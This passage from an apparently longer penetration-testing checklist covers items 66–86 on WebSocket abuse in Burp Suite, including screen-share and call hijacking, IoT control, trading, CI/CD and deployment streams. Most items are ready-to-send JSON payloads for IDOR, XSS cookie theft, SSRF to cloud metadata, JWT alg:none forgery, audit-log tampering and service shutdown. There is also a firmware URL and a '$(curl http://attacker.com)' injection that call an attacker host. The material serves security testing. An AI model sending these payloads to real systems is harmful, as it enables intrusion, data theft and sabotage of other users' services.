Severity: CRITICAL

66. WebSocket Screen Sharing Abuse
Steps:

Open Burp Suite → Proxy → WebSockets history → Start a screen sharing session in the target app → Find the signaling/session messages:

json{"type":"screen_share_start","sessionId":"ss_abc123","sharedBy":"user_123"}
{"type":"viewer_join","sessionId":"ss_abc123","viewerId":"user_456"}

Try joining another user's screen share session by ID without being invited:

json{"type":"viewer_join","sessionId":"ss_abc123"}
If you get session data or WebRTC offer back, you can view their screen

Try enumerating session IDs — in Burp Intruder, mark the session ID as payload position → Use common patterns (sequential numbers, UUIDs) → Check which sessions accept viewer join
Try joining a session as the sharer (impersonation):

json{"type":"screen_share_start","sessionId":"ss_abc123","sharedBy":"OTHER_USER_ID"}
This might let you inject into an existing sharing session

Try requesting recording of a session you're viewing:

json{"type":"record_session","sessionId":"ss_abc123"}

Check if screen share sessions have no expiry — capture a session ID → Wait 24 hours → Try to join again → Is the session still joinable?
Try getting the list of all active screen share sessions:

json{"action":"getActiveSessions","type":"screen_share"}
🔴 Vulnerable When:

Joining another user's screen share session by guessing/enumerating the session ID works
Screen share session IDs are sequential or predictable
List of all active sessions is returned (exposes who is sharing with whom)
Sessions remain joinable hours/days after they should have expired

Severity: HIGH to CRITICAL

67. WebSocket Voice/Video over WebRTC via WebSocket Signaling
Steps:

Open Burp Suite → Proxy → WebSockets history → Start a voice/video call → Find WebRTC signaling messages:

json{"type":"offer","sdp":"v=0\r\no=- 123...","callId":"call_abc","from":"user_1","to":"user_2"}
{"type":"answer","sdp":"v=0\r\no=- 456...","callId":"call_abc"}
{"type":"ice_candidate","candidate":"candidate:1...","callId":"call_abc"}

Try sending an SDP offer to another user's callId:

json{"type":"offer","sdp":"ATTACKER_SDP","callId":"call_abc","from":"OTHER_USER_ID","to":"victim_id"}
This might inject into an ongoing call

Look at the SDP offer — it contains ICE candidates with IP addresses → Note all IP addresses in the SDP → These may reveal the user's real IP even if behind a VPN
Try sending ICE candidates for a call you're not in:

json{"type":"ice_candidate","candidate":"candidate:1 1 UDP 2122252543 ATTACKER_IP 54321 typ host","callId":"other_call_id"}

Try joining a call as an unauthorized third party → If signaling doesn't validate you're a participant, you can exchange ICE candidates and establish a media channel
Check if call signaling messages expose call metadata (who is calling who, when, duration) → Subscribe to any call event channel:

json{"action":"subscribe","channel":"call_events"}

Try call hijacking — send a termination message for a call you're not in:

json{"type":"hangup","callId":"call_abc"}
🔴 Vulnerable When:

Sending an SDP offer for another user's call ID disrupts or intercepts the call
ICE candidates in SDP expose real IP addresses of callers
You can inject ICE candidates for a call you're not authorized to be in
Call termination message (hangup) for any call ID is accepted without authorization
Call event channel reveals who is calling whom (privacy violation)

Severity: HIGH to CRITICAL

68. WebSocket Collaborative Editing Security
Steps:

Open Burp Suite → Proxy → WebSockets history → Open a collaborative document in the target app → Find operational transform or CRDT messages:

json{"type":"operation","docId":"doc_123","ops":[{"retain":10},{"insert":"text"}],"revision":5}
{"type":"change","documentId":"doc_456","delta":{"ops":[{"insert":"hello"}]}}

Try sending operations to a document you don't have edit access to (only view access, or no access):

json{"type":"operation","docId":"ANOTHER_USER_DOC_ID","ops":[{"insert":"<script>alert(1)</script>"}]}

Try XSS via document content — insert HTML/script tags through the WebSocket:

json{"type":"change","delta":{"ops":[{"insert":"<img src=x onerror=alert(document.cookie)>"}]}}
Check if this is sanitized when rendered for other viewers

Try document ID enumeration — change docId to sequential IDs → Check which documents you can read or write to
Try inserting operations with a forged user ID — to make edits appear to come from another user:

json{"type":"operation","docId":"doc_123","userId":"ADMIN_USER_ID","ops":[{"insert":"forged content"}]}

Try revision number manipulation — set the revision number to 0 on a document with 100 revisions:

json{"type":"operation","docId":"doc_123","ops":[{"delete":99999}],"revision":0}
This might delete all content if revision check is skipped

Try reading document history for documents you shouldn't access:

json{"action":"getHistory","docId":"PRIVATE_DOC_ID","fromRevision":0}
🔴 Vulnerable When:

Operations sent to another user's private document are accepted and changes appear in their document
XSS payload inserted via WebSocket is rendered to other document viewers without sanitization
Document ID enumeration reveals private documents from other users
Revision 0 operation with large delete removes all content from a document (destructive write via revision bypass)

Severity: HIGH to CRITICAL

69. WebSocket Live Streaming Data Exfiltration
Steps:

Open Burp Suite → Proxy → WebSockets history → Start a live stream in the target app → Find stream subscription messages:

json{"action":"subscribe","streamId":"stream_abc123"}
{"type":"watch","channelId":"channel_456"}

Try subscribing to private/unlisted streams by guessing the stream ID:


Note your own stream ID format → If it's stream_abc123, try stream_abc124, stream_abc122


Check what metadata is returned when you subscribe to a stream:

json{"type":"stream_info","streamId":"stream_abc123","host":"user@email.com","location":"Home Office, New York","ip":"1.2.3.4"}
Look for leaked host information

Try requesting the stream viewer list for any stream:

json{"action":"getViewers","streamId":"stream_abc123"}
Check if this reveals who is watching (privacy issue)

Try accessing private stream events (like donation notifications, private chat):

json{"action":"subscribe","channel":"private_stream_events_stream_abc123"}

Try getting stream analytics that should be owner-only:

json{"action":"getAnalytics","streamId":"stream_abc123"}
{"action":"getViewerStats","streamId":"stream_abc123"}

Check if you can send stream control commands without being the host:

json{"action":"endStream","streamId":"stream_abc123"}
{"action":"muteStream","streamId":"stream_abc123"}
🔴 Vulnerable When:

Subscribing to stream ID ±1 from your own lets you watch private streams
Stream info includes host's email, real IP address, or location
You can view the complete viewer list for any stream (privacy violation)
Stream control commands (endStream, muteStream) work without host authentication

Severity: MEDIUM to HIGH

70. WebSocket IoT Device Control Security
Steps:

Open Burp Suite → Proxy → WebSockets history → Find IoT device control messages:

json{"action":"control","deviceId":"device_abc123","command":"turnOn"}
{"type":"device_command","id":"sensor_456","payload":{"temperature":25}}

Try sending commands to other users' devices by changing the device ID:

json{"action":"control","deviceId":"device_abc124","command":"turnOn"}
{"action":"control","deviceId":"device_abc122","command":"turnOff"}

Try device ID enumeration in Burp Intruder — mark the device ID as position → Try sequential numbers or common IoT device ID formats
Try sending dangerous commands:

json{"action":"control","deviceId":"device_abc123","command":"factory_reset"}
{"action":"control","deviceId":"device_abc123","command":"update_firmware","url":"http://attacker.com/malware.bin"}
{"action":"control","deviceId":"device_abc123","command":"set_schedule","cron":"* * * * * reboot"}

Try firmware update injection — if firmware update is a supported command, point it to your server:

json{"action":"update","deviceId":"device_abc123","firmwareUrl":"http://YOUR_BURP_COLLABORATOR_URL/firmware.bin"}
Check if the device makes a request to your Collaborator URL (confirms SSRF/firmware injection)

Try subscribing to all device events (not just your own):

json{"action":"subscribe","channel":"all_device_events"}
{"action":"subscribe","channel":"device_telemetry"}

Try getting device configuration and credentials:

json{"action":"getConfig","deviceId":"device_abc123"}
{"action":"getCredentials","deviceId":"device_abc123"}
🔴 Vulnerable When:

Sending turnOff command to another user's device ID actually turns off their device
factory_reset command is accepted without additional confirmation (destructive IDOR)
Firmware update URL is fetched by the server/device from your attacker-controlled URL
getConfig or getCredentials returns WiFi passwords, API keys, or device secrets for any device ID
All device telemetry stream reveals data from devices belonging to all users

Severity: CRITICAL

71. WebSocket Game State Manipulation
Steps:

Open Burp Suite → Proxy → WebSockets history → Play the target game and capture all WebSocket messages → Look for game state messages:

json{"type":"move","x":100,"y":200,"playerId":"player_123"}
{"action":"collectItem","itemId":"gold_coin_456","amount":1}
{"event":"gameState","health":100,"score":500,"level":3,"position":{"x":100,"y":200}}

Right-click a state message → Send to Repeater → Try manipulating values:

json{"type":"move","x":99999,"y":99999}             // Teleport to invalid position
{"action":"collectItem","itemId":"rare_item_1","amount":99999}  // Collect impossible amounts
{"event":"updateScore","score":999999999}
{"event":"setHealth","health":999999}
{"action":"setLevel","level":100}

Try sending duplicate item collection events:

json{"action":"collectItem","itemId":"gold_coin_456","amount":1}
Send this same message 100 times in Intruder → Check if item count goes up 100x

Try accessing other players' game state:

json{"action":"getPlayerState","playerId":"OTHER_PLAYER_ID"}
{"action":"viewInventory","playerId":"OTHER_PLAYER_ID"}

Try sending actions on behalf of another player:

json{"type":"move","playerId":"OTHER_PLAYER_ID","x":0,"y":0}
{"action":"attack","attackerId":"OTHER_PLAYER_ID","targetId":"victim"}

Try negative values for game resources:

json{"action":"spendCurrency","amount":-1000}    // Negative spend = gain
{"action":"takeDamage","amount":-100}         // Negative damage = heal

Try time manipulation — if the game uses client timestamps:

json{"type":"move","timestamp":"2020-01-01T00:00:00Z","x":100,"y":200}
Set timestamp to past → Check if movement speed limits are bypassed
🔴 Vulnerable When:

Setting score/health to arbitrary values is accepted server-side and persists
Collecting the same item 100 times by replaying the message gives 100x the items
Negative spending values actually increase your currency balance
You can move other players by sending actions with their player ID
Viewing another player's private inventory by their ID succeeds

Severity: HIGH

72. WebSocket Trading Platform Price Manipulation
Steps:

Open Burp Suite → Proxy → WebSockets history → On the trading platform, place a buy/sell order → Capture the WebSocket messages:

json{"type":"placeOrder","symbol":"BTC","side":"buy","amount":0.1,"price":50000}
{"action":"trade","asset":"ETH","quantity":1,"limitPrice":3000,"orderType":"limit"}

Right-click → Send to Repeater → Try manipulating the price field:

json{"type":"placeOrder","symbol":"BTC","side":"buy","amount":0.1,"price":0.01}  // Buy at almost 0
{"type":"placeOrder","symbol":"BTC","side":"buy","amount":0.1,"price":-1}    // Negative price
{"type":"placeOrder","symbol":"BTC","side":"buy","amount":0.1,"price":null}
{"type":"placeOrder","symbol":"BTC","side":"buy","amount":0.1,"price":""}

Try race condition on order execution — place the same order 10 times simultaneously using Burp's Send Group in Parallel:

json{"type":"placeOrder","symbol":"BTC","side":"buy","amount":0.1,"price":50000}
Check if 10 orders execute when you only had balance for 1

Try order ID manipulation:

json{"type":"cancelOrder","orderId":"OTHER_USER_ORDER_ID"}
{"type":"cancelOrder","orderId":"1"}
{"type":"cancelOrder","orderId":"2"}

Try manipulating the trade amount:

json{"type":"placeOrder","symbol":"BTC","side":"buy","amount":0,"price":50000}    // Zero amount
{"type":"placeOrder","symbol":"BTC","side":"buy","amount":-1,"price":50000}   // Negative amount
{"type":"placeOrder","symbol":"BTC","side":"buy","amount":999999,"price":1}   // Huge amount at tiny price

Try viewing other users' orders:

json{"action":"getOrderBook","userId":"OTHER_USER_ID"}
{"action":"getPortfolio","accountId":"ANOTHER_ACCOUNT_ID"}

Try subscribing to real-time order flow from all users:

json{"action":"subscribe","channel":"all_orders"}
{"action":"subscribe","channel":"order_flow"}
🔴 Vulnerable When:

Order with price 0.01 for a $50,000 asset is accepted and executes at that price
Negative price or amount values cause balance to increase instead of error
Race condition allows placing 10 orders simultaneously when balance only allows 1
You can cancel orders belonging to other users (cancelOrder with their order ID)
Subscribing to all_orders channel reveals real-time order flow from all platform users

Severity: CRITICAL

73. WebSocket Financial Data Stream Security
Steps:

Open Burp Suite → Proxy → WebSockets history → Subscribe to financial data streams:

json{"action":"subscribe","stream":"portfolio_updates"}
{"action":"subscribe","channel":"account_transactions"}
{"action":"subscribe","feed":"balance_changes"}

Try subscribing to another user's financial stream:

json{"action":"subscribe","stream":"portfolio_updates","userId":"OTHER_USER_ID"}
{"action":"subscribe","accountId":"ANOTHER_ACCOUNT_ID","stream":"transactions"}

Check the data that flows in the stream → Look for:


Account numbers
Transaction amounts and counterparties
Balance information
Investment positions


Try to push fake financial events into the stream:

json{"type":"transaction","amount":10000,"type":"credit","accountId":"YOUR_ACCOUNT"}
Check if this updates your displayed balance (not validated server-side)

Try subscribing to aggregated financial streams that might leak individual data:

json{"action":"subscribe","channel":"market_depth"}
{"action":"subscribe","channel":"trade_feed"}
Watch if individual user trades are identifiable

Try getting historical financial data for other accounts:

json{"action":"getHistory","accountId":"ANOTHER_ACCOUNT_ID","days":30}
{"action":"getStatement","userId":"OTHER_USER_ID","month":"2024-01"}
🔴 Vulnerable When:

Subscribing to another account's financial stream delivers their real-time transaction data
Pushing a fake credit transaction updates your account balance (client-side trust)
Trade feed reveals individual users' financial positions or transaction amounts
Historical statements for other accounts are returned without authorization

Severity: CRITICAL

74. WebSocket Notification Stream Access Control
Steps:

Open Burp Suite → Proxy → WebSockets history → Find notification subscription messages:

json{"action":"subscribe","channel":"notifications","userId":"user_123"}
{"type":"subscribe","topic":"user_notifications","token":"abc123"}

Right-click → Send to Repeater → Change userId to another user:

json{"action":"subscribe","channel":"notifications","userId":"user_124"}
{"action":"subscribe","channel":"notifications","userId":"admin_user_id"}
Click Send → Check if subscription succeeds and you receive their notifications

Try subscribing using just the channel name without specifying a user (channel might auto-authorize):

json{"action":"subscribe","channel":"user_124_notifications"}
{"action":"subscribe","channel":"admin_alerts"}

Try enumerating notification channels → Use Intruder with the user ID as payload position → Numbers 1-500 → Check which channels accept your subscription
Try subscribing to system-level notification channels:

json{"action":"subscribe","channel":"security_alerts"}
{"action":"subscribe","channel":"admin_notifications"}
{"action":"subscribe","channel":"password_reset_notifications"}

Try sending notifications as another user or sending fake notifications:

json{"action":"sendNotification","toUserId":"victim_id","message":"Your password was changed","type":"security"}

Check what data is included in notifications that flow through → They might contain sensitive tokens (e.g., one-time links, verification codes):

json{"type":"notification","message":"Your verification code is: 123456"}
🔴 Vulnerable When:

Subscribing with another user's ID delivers their real notifications to you
Channel name alone (without auth check) grants access to another user's notification stream
Password reset or security alert notifications are interceptable via subscription
Sending fake security notifications to other users succeeds (social engineering enabler)

Severity: HIGH to CRITICAL

75. WebSocket Event Stream Authorization Bypass
Steps:

Open Burp Suite → Proxy → WebSockets history → Subscribe to event streams:

json{"action":"subscribe","eventStream":"user_activity"}
{"type":"subscribe","stream":"audit_events","filter":{"userId":"user_123"}}

Right-click → Send to Repeater → Remove the user filter to get all events:

json{"action":"subscribe","eventStream":"user_activity"}
{"type":"subscribe","stream":"audit_events"}
Check if you receive events from all users instead of just yourself

Try subscribing to privileged event streams:

json{"action":"subscribe","eventStream":"admin_actions"}
{"action":"subscribe","eventStream":"security_events"}
{"action":"subscribe","eventStream":"system_changes"}
{"action":"subscribe","eventStream":"all_user_activity"}

Try filtering by another user's ID:

json{"type":"subscribe","stream":"audit_events","filter":{"userId":"OTHER_USER_ID"}}
Check if you receive audit trail events for another user (their action history)

Try to inject into the filter to bypass restrictions:

json{"type":"subscribe","stream":"audit_events","filter":{"userId":"user_123 OR 1=1"}}
{"type":"subscribe","stream":"user_activity","filter":{"role":"admin"}}

Try getting a snapshot of all current events (not just future):

json{"action":"getEventHistory","stream":"audit_events","since":"2020-01-01"}
🔴 Vulnerable When:

Removing user filter from subscription causes server to push events from all users (mass data leak)
Admin/security event streams are accessible to regular users
Filter with another user's ID delivers their full audit trail (activity history exposure)
Filter injection (OR 1=1) causes subscription to match all events across all users

Severity: HIGH to CRITICAL

76. WebSocket Audit Log Stream Data Leakage
Steps:

Open Burp Suite → Proxy → WebSockets history → Look for any audit/logging related subscription messages:

json{"action":"subscribe","channel":"audit_log"}
{"type":"watch","stream":"activity_log","userId":"user_123"}

Try subscribing to audit logs directly:

json{"action":"subscribe","channel":"audit_log"}
{"action":"subscribe","channel":"access_log"}
{"action":"subscribe","channel":"security_log"}
{"action":"subscribe","channel":"change_log"}

If subscribed, watch for incoming messages → They might contain:


Other users' login times and IPs
What files/data other users accessed
Admin actions taken
Security events and alerts
Password change events


Try to query the audit log for specific users or time ranges:

json{"action":"queryAuditLog","userId":"OTHER_USER_ID","startTime":"2024-01-01"}
{"action":"getAuditTrail","entityId":"sensitive_resource_id"}

Try subscribing to audit logs without authentication → Remove auth headers from the upgrade request and try subscribing → Audit logs are often less secured than main data
Try writing to the audit log (to hide your tracks or inject false entries):

json{"action":"createAuditEntry","userId":"admin_id","action":"password_change","result":"success"}

Look for specific sensitive fields in received audit events: user IPs, session tokens, sensitive data that was accessed

🔴 Vulnerable When:

Audit log subscription delivers entries from all users' activities (not just yours)
Other users' login IPs and session details are visible in the audit stream
Writing to the audit log succeeds (allows covering tracks or injecting false audit entries)
Audit log accessible without authentication
Audit entries include raw sensitive data values (not just "accessed field X" but "field X value was ABC123")

Severity: HIGH to CRITICAL

77. WebSocket Monitoring Stream Metric Exposure
Steps:

Open Burp Suite → Proxy → WebSockets history → Look for monitoring/metrics subscriptions:

json{"action":"subscribe","channel":"metrics"}
{"type":"monitor","target":"system_health"}

Try subscribing to monitoring channels:

json{"action":"subscribe","channel":"system_metrics"}
{"action":"subscribe","channel":"performance_monitor"}
{"action":"subscribe","channel":"resource_usage"}
{"action":"subscribe","channel":"server_stats"}

Watch what data flows in the metrics stream:


CPU/memory usage (reveals server capacity and load patterns)
Error rates (reveals attack success rates)
User counts per server (reveals infrastructure topology)
Database query counts (reveals what queries are being run)
Cache hit rates (reveals data access patterns)


Try to get more detailed metrics:

json{"action":"subscribe","metrics":["db_queries","error_traces","user_sessions","internal_ips"]}

Try subscribing to application performance monitoring data:

json{"action":"subscribe","channel":"apm"}
{"action":"subscribe","channel":"distributed_traces"}
These can reveal internal service names, IPs, and architecture

Try requesting metric history:

json{"action":"getMetricHistory","metric":"error_rate","period":"7days"}

Look for infrastructure topology data in metrics — internal IP addresses, service names, port numbers, database server names

🔴 Vulnerable When:

Metrics stream reveals internal server IPs, hostnames, or service names (infrastructure recon)
Error traces in the stream expose stack traces with file paths, class names, or internal code details
User count metrics reveal total platform user base or per-server user counts
Distributed traces expose internal service architecture and inter-service communication patterns

Severity: MEDIUM to HIGH

78. WebSocket Debug Stream Information Disclosure
Steps:

Open Burp Suite → Proxy → WebSockets history → Try subscribing to debug channels:

json{"action":"subscribe","channel":"debug"}
{"action":"subscribe","channel":"verbose_log"}
{"action":"subscribe","channel":"dev_events"}
{"action":"subscribe","channel":"trace"}
{"action":"subscribe","channel":"internal_log"}

Try accessing debug endpoints in the WebSocket URL:

wss://target.com/ws/debug
wss://target.com/ws?debug=true
wss://target.com/ws?verbose=1
wss://target.com/ws/dev
Right-click existing Upgrade request in HTTP history → Send to Repeater → Modify URL path

Try adding debug headers to the WebSocket Upgrade request:

X-Debug: 1
X-Dev-Mode: true
X-Verbose: 1
X-Internal: true
X-Staff: true

After subscribing, watch for debug messages that might include:


SQL queries being executed
Internal variable values
Stack traces
Authentication tokens
Internal API keys
Environment variables


Try sending a debug command:

json{"action":"debug","command":"getEnv"}
{"action":"debug","command":"dumpConfig"}
{"action":"debug","command":"showSessions"}
{"action":"debug","command":"phpinfo"}

Try accessing the debug channel without authentication — debug channels are often left with weaker or no auth

🔴 Vulnerable When:

Debug channel subscription returns SQL queries, stack traces, or internal variable values
Adding X-Debug: 1 header causes the server to return extra debug information in responses
getEnv or dumpConfig commands return environment variables including API keys or database passwords
Debug WebSocket endpoint is accessible on production without authentication

Severity: CRITICAL

79. WebSocket Admin Stream Privilege Escalation
Steps:

Open Burp Suite → Proxy → WebSockets history → As a regular user, try subscribing to admin channels:

json{"action":"subscribe","channel":"admin_stream"}
{"action":"subscribe","channel":"admin_events"}
{"action":"subscribe","channel":"management_feed"}

Try sending admin commands via WebSocket:

json{"action":"admin.deleteUser","userId":"OTHER_USER_ID"}
{"action":"admin.getConfig","key":"smtp_password"}
{"action":"admin.listUsers","page":1}
{"action":"admin.createAdmin","email":"attacker@evil.com"}

Try role escalation via message:

json{"action":"updateProfile","role":"admin"}
{"action":"setPermissions","userId":"YOUR_USER_ID","permissions":["admin","superuser"]}

Try accessing the admin WebSocket endpoint with URL manipulation:

wss://target.com/ws/admin
wss://target.com/admin/ws
wss://target.com/ws?role=admin
In Burp Repeater, modify the URL in the Upgrade request

Try JWT manipulation if JWT is used for WebSocket auth:


In Burp → JSON Web Tokens extension (install from BApp Store)
Intercept the Upgrade request → Find JWT in Cookie or Authorization header
Use the JWT extension to decode the JWT → Change "role":"user" to "role":"admin" → Try with alg:none attack → Send and check if admin access is granted


Try accessing admin functionality by subscribing to admin subprotocol:

Sec-WebSocket-Protocol: admin
🔴 Vulnerable When:

Admin channel subscription as a regular user returns real admin events
admin.listUsers or admin.getConfig commands work without admin role
updateProfile with role: admin actually escalates your account to admin
JWT alg:none attack allows forging an admin JWT for WebSocket access
Admin URL path (/ws/admin) is accessible without admin authentication

Severity: CRITICAL

80. WebSocket Internal Service Stream Access Bypass
Steps:

Open Burp Suite → Proxy → WebSockets history → Try subscribing to internal service streams:

json{"action":"subscribe","channel":"internal_events"}
{"action":"subscribe","channel":"service_bus"}
{"action":"subscribe","channel":"internal_api"}
{"action":"subscribe","channel":"microservice_events"}

Try connecting to internal WebSocket endpoints via SSRF:

json{"action":"proxy","target":"ws://internal-service:8080/ws"}
{"action":"connect","url":"ws://10.0.0.1:6379"}  // Redis
{"action":"connect","url":"ws://10.0.0.1:27017"}  // MongoDB

Try accessing internal services via the upgrade request URL manipulation:

GET /ws?target=http://169.254.169.254/latest/meta-data/ HTTP/1.1  (AWS metadata)
GET /ws?url=http://internal-admin-panel:8080/ HTTP/1.1

Try adding internal network IP headers:

X-Forwarded-For: 10.0.0.1
X-Real-IP: 192.168.1.1
X-Forwarded-Host: internal-service.local
These might trick the server into thinking you're on the internal network

Try accessing localhost services via the WebSocket:

json{"action":"fetch","url":"http://localhost:8080/admin"}
{"action":"request","target":"http://127.0.0.1:9200/_cat/indices"}  // Elasticsearch

Check Burp Collaborator for any SSRF hits — use your collaborator URL in any URL parameter

🔴 Vulnerable When:

Internal service channel subscription returns microservice event data
proxy or connect action causes server to connect to internal IP/port (SSRF)
AWS metadata endpoint (169.254.169.254) returns instance credentials when passed as URL parameter
Elasticsearch, Redis, or other internal service data is returned via fetch/request actions
X-Forwarded-For: 10.0.0.1 causes the server to grant internal network access privileges

Severity: CRITICAL

81. WebSocket Microservice Stream Enumeration
Steps:

Open Burp Suite → Proxy → WebSockets history → Watch for any service routing in messages:

json{"service":"user-service","action":"getProfile"}
{"target":"payment-service","method":"processPayment"}
{"microservice":"inventory","operation":"checkStock"}

Try enumerating service names in Burp Intruder:


Mark the service name as payload position
Use wordlist: user-service, payment-service, order-service, admin-service, auth-service, notification-service, file-service, email-service, report-service, config-service, internal-service
Run attack → Check which services respond


For each discovered service, try calling internal methods:

json{"service":"config-service","action":"getConfig"}
{"service":"auth-service","action":"createToken","userId":"admin"}
{"service":"admin-service","action":"listUsers"}

Try path traversal between services:

json{"service":"../admin-service","action":"getAdminData"}
{"service":"user-service/../admin-service","action":"privilegedAction"}

Try calling service health/debug endpoints:

json{"service":"user-service","action":"health"}
{"service":"user-service","action":"metrics"}
{"service":"user-service","action":"env"}
{"service":"user-service","action":"debug"}

Check if inter-service authorization is enforced — try to make service A perform an action it should only do when called by service B

🔴 Vulnerable When:

Intruder discovers service names that don't appear in documentation (hidden internal services)
Calling config-service/getConfig returns database passwords, API keys, or internal configs
Creating an auth token via auth-service/createToken with admin user ID succeeds
No inter-service authorization — any service can call any other service's methods

Severity: HIGH to CRITICAL

82. WebSocket Database Change Stream Data Leakage
Steps:

Open Burp Suite → Proxy → WebSockets history → Look for database change/sync messages (common in apps using MongoDB change streams or similar):

json{"type":"db_change","collection":"users","operation":"update","documentId":"user_123"}
{"event":"data_change","table":"orders","record":{"id":456,"status":"shipped"}}

Try subscribing to database change streams:

json{"action":"subscribe","channel":"db_changes"}
{"action":"subscribe","stream":"database_changes","collection":"users"}
{"action":"subscribe","stream":"realtime_sync","table":"*"}

If you receive change events, check what data is included — full document before/after change? Only the changed fields? Any sensitive fields?
Try subscribing to specific sensitive collections/tables:

json{"action":"subscribe","stream":"db_changes","collection":"passwords"}
{"action":"subscribe","stream":"db_changes","collection":"sessions"}
{"action":"subscribe","stream":"db_changes","collection":"api_keys"}
{"action":"subscribe","stream":"db_changes","table":"payment_methods"}

Try using wildcard collection subscriptions:

json{"action":"subscribe","stream":"db_changes","collection":"*"}
{"action":"subscribe","stream":"db_changes","table":"*"}

Watch the stream for other users' data changes — when any user updates their profile or makes an order, check if you receive that change event with their full data
Try to trigger intentional changes on another user's account → Watch if the change stream delivers the changed data to you

🔴 Vulnerable When:

Database change stream delivers full document data including other users' sensitive fields
Subscribing to sessions or api_keys collection change stream reveals active session tokens or API keys
Wildcard collection subscription returns changes from all tables including privileged ones
Change stream events include the "before" state of documents (previous passwords, etc.)

Severity: CRITICAL

83. WebSocket Cache Invalidation Stream Abuse
Steps:

Open Burp Suite → Proxy → WebSockets history → Look for cache invalidation messages:

json{"type":"cache_invalidate","key":"user_profile_123"}
{"event":"cache_clear","resource":"product_list"}
{"action":"invalidate","cacheKey":"session_user_456"}

Try sending cache invalidation commands for other users' data:

json{"action":"invalidate","cacheKey":"user_profile_ADMIN_USER_ID"}
{"action":"cache_clear","resource":"user_session_OTHER_USER_ID"}
If this works, it forces those users' data to be re-fetched (can cause temporary data unavailability)

Try invalidating session caches — if session data is cached:

json{"action":"invalidate","cacheKey":"session_OTHER_USER_SESSION_TOKEN"}
This might force a session lookup that could expose data or cause logout

Try to enumerate cache keys by sending invalidation for sequential IDs:

json{"action":"invalidate","cacheKey":"user_profile_1"}
{"action":"invalidate","cacheKey":"user_profile_2"}
Observe if different responses tell you which IDs exist (user enumeration)

Try poisoning the cache via WebSocket — send a fake cache update:

json{"action":"cache_set","key":"user_profile_VICTIM_ID","value":{"role":"disabled","banned":true}}
Check if the victim's next page load shows they're banned (cache poisoning)

Try subscribing to cache invalidation events to learn about user activity patterns:

json{"action":"subscribe","channel":"cache_events"}
User activity causes their cache to be invalidated → cache events reveal activity timing
🔴 Vulnerable When:

Invalidating another user's session cache causes them to be logged out (unauthorized session termination)
Cache poisoning via WebSocket causes victim user to see altered data on next page load
Cache key patterns allow enumerating all user IDs by triggering and observing different responses
Cache invalidation events stream reveals which users are active (privacy violation via activity tracking)

Severity: MEDIUM to HIGH

84. WebSocket Search Index Update Stream Manipulation
Steps:

Open Burp Suite → Proxy → WebSockets history → Look for search index update messages:

json{"type":"index_update","collection":"products","documentId":"prod_123","action":"update"}
{"event":"search_reindex","entity":"user","id":"user_456","data":{"name":"John","email":"john@email.com"}}

Try injecting into the search index:

json{"type":"index_update","collection":"users","documentId":"attacker_controlled","action":"add","data":{"name":"<script>alert(1)</script>","role":"admin"}}
Check if searching for this user in the app triggers XSS

Try overwriting another user's search index entry:

json{"type":"index_update","collection":"users","documentId":"VICTIM_USER_ID","action":"update","data":{"role":"banned","name":"HACKER_WAS_HERE"}}
Check if the victim's profile now shows altered data in search results

Try deleting entries from the search index:

json{"type":"index_update","collection":"products","documentId":"PRODUCT_123","action":"delete"}
This makes the product unsearchable — availability manipulation

Try subscribing to index update events to see all data being indexed:

json{"action":"subscribe","channel":"index_updates"}
{"action":"subscribe","stream":"search_events"}
All indexed data (possibly including private user data) flows through here

Try adding false content to search index that points to your site or contains malicious links

🔴 Vulnerable When:

XSS payload in indexed data is reflected in search results without sanitization
Overwriting victim's search index entry with role: admin causes the app to treat them differently
Subscribing to index update stream reveals all users' data as it's indexed (mass data exposure)
Deleting product from search index successfully makes it unsearchable (business disruption)

Severity: HIGH

85. WebSocket Deployment Event Stream Security
Steps:

Open Burp Suite → Proxy → WebSockets history → Try subscribing to deployment streams:

json{"action":"subscribe","channel":"deployments"}
{"action":"subscribe","stream":"deployment_events"}
{"action":"subscribe","channel":"releases"}
{"action":"subscribe","channel":"build_status"}

Watch what data flows — deployment events often contain:


Environment variable values passed during deployment
Server configurations
Build artifact URLs
Container image tags and registry credentials
Internal service URLs and ports


Try to trigger a deployment:

json{"action":"deploy","service":"main-app","version":"attacker-controlled-version"}
{"action":"rollback","service":"user-service","version":"1.0.0"}

Try getting deployment history:

json{"action":"getDeploymentHistory","service":"*","limit":100}

Try accessing deployment logs which may contain secrets:

json{"action":"getLogs","deploymentId":"deploy_abc123"}
{"action":"subscribe","channel":"deployment_logs","deploymentId":"deploy_abc123"}

Try to stop or restart a service via deployment stream:

json{"action":"restart","service":"auth-service"}
{"action":"stop","service":"payment-service"}
{"type":"scale","service":"api-gateway","replicas":0}
🔴 Vulnerable When:

Deployment event stream reveals environment variables including AWS keys, database passwords, API secrets
Deployment logs accessible via WebSocket expose container configurations with embedded credentials
Triggering a rollback command succeeds (arbitrary deployment manipulation)
Scaling a service to 0 replicas succeeds (denial of service via WebSocket)
Subscribing to deployment stream reveals internal service architecture and registry credentials

Severity: CRITICAL

86. WebSocket CI/CD Pipeline Stream Vulnerability
Steps:

Open Burp Suite → Proxy → WebSockets history → Try subscribing to CI/CD pipeline streams:

json{"action":"subscribe","channel":"pipeline_events"}
{"action":"subscribe","stream":"build_events"}
{"action":"watch","pipeline":"main_pipeline"}
{"action":"subscribe","channel":"test_results"}

Watch what data flows — CI/CD streams often expose:


Source code snippets in build logs
Test output with data samples
Environment variables set during build
Repository tokens and deploy keys
Internal infrastructure details


Try triggering a pipeline build with a malicious payload:

json{"action":"triggerBuild","pipeline":"main","branch":"main","env":{"MALICIOUS_VAR":"$(curl http://attacker.com)"}}

Try accessing other teams' pipelines:

json{"action":"subscribe","pipeline":"competitor_team_pipeline"}
{"action":"getBuilds","projectId":"OTHER_TEAM_PROJECT_ID"}

Try accessing build artifacts:

json{"action":"getArtifact","buildId":"build_123","path":"secrets.env"}
{"action":"downloadArtifact","buildId":"build_123","artifact":"test_data.sql"}
Build artifacts often contain real test data with real user information

Try getting pipeline configuration which contains secret variables:

json{"action":"getConfig","pipeline":"main_pipeline"}
{"action":"getSecrets","projectId":"project_123"}

Try to cancel or modify another team's running pipeline:

json{"action":"cancelBuild","buildId":"OTHER_TEAM_BUILD_ID"}
🔴 Vulnerable When:

Build logs via WebSocket contain environment variables with real API keys, tokens, or passwords
Pipeline configuration endpoint returns secret/masked variables in plaintext
Triggering build with env injection causes build server to execute commands or make external requests
Build artifacts contain real user data used for testing (PII exposure)
Accessing other projects' pipelines reveals their source code, tests, or configurations

Severity: CRITICAL